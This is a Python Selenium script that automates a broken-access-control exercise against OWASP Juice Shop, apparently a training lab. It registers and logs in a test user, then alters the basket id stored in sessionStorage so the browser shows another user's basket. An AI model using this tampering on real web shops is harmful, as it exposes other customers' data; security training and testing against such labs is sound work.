from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import jsbeautifier
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
from selenium.webdriver.support.ui import Select

try:
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	# Disable the password manager's leak detection
	chrome_options = webdriver.ChromeOptions()
	chrome_options.add_experimental_option("prefs", {
		"profile.password_manager_leak_detection": False,
		"credentials_enable_service": False,  # Disables the "save password" prompt
		"profile.password_manager_enabled": False # Disables the password manager entirely
	})

  #User opens browser
	driver = webdriver.Chrome(options=chrome_options)

	driver.get(f"http://{IP_ADDRESS}:{PORT}")

	#User navigates to registration screen
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//a[contains(., 'Not yet a customer?')]"))).click()

	#User registers as new user
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "emailControl"))).send_keys("test1@test.com")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "passwordControl"))).send_keys("Password1!")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "repeatPasswordControl"))).send_keys("Password1!")

	mat_select_element = WebDriverWait(driver, 10).until(
		EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-select[role='combobox']"))
	)
	mat_select_element.click()
	mat_option_element = WebDriverWait(driver, 10).until(
		EC.element_to_be_clickable((By.XPATH, f"//mat-option[contains(., 'Your eldest siblings middle name?')]"))
	)
	mat_option_element.click()
	
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "securityAnswerControl"))).send_keys("test")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Register')]"))).click()

	#User logs in
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "email"))).send_keys("test1@test.com")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "password"))).send_keys("Password1!")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Log in')]"))).click()

	#User adds first 4[arbitrary] items to basket
	addToBasketButtons = WebDriverWait(driver, 20).until(EC.presence_of_all_elements_located((By.XPATH, "//button[contains(., 'Add to Basket')]")))
	for i in range(4):
		WebDriverWait(driver, 20).until(EC.element_to_be_clickable(addToBasketButtons[i])).click()
  
	#User proceeds to basket
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Your Basket')]"))).click()

	key_to_get = "bid"

	retrieved_value = driver.execute_script(f"return window.sessionStorage.getItem('{key_to_get}');")
	print(f"Retrieved session storage item: '{key_to_get}' = '{retrieved_value}'")

	final_value = int(retrieved_value) - 1
	driver.execute_script(f"window.sessionStorage.setItem('{key_to_get}', '{final_value}');")
	
	new_value = driver.execute_script(f"return window.sessionStorage.getItem('{key_to_get}');")
	print(f"Retrieved session storage item: '{key_to_get}' = '{new_value}'")
	#User proceeds to basket
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Your Basket')]"))).click()
	
finally:
  driver.quit()
